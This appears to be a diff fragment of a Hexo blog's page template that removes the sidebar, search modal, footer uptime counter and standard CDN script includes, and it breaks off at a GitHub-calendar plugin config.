-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/Loora1N" target="_blank" rel="nofollow noopener"><span>Loora1N</span></a> <i class="iconfont icon-love"></i> <a href="https://space.bilibili.com/33242548?spm_id_from=333.1007.0.0" target="_blank" rel="nofollow noopener"><span>鷺雨君</span></a>
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("06/03/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀running🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>   
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-<!-- hexo injector body_end start -->
+    <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
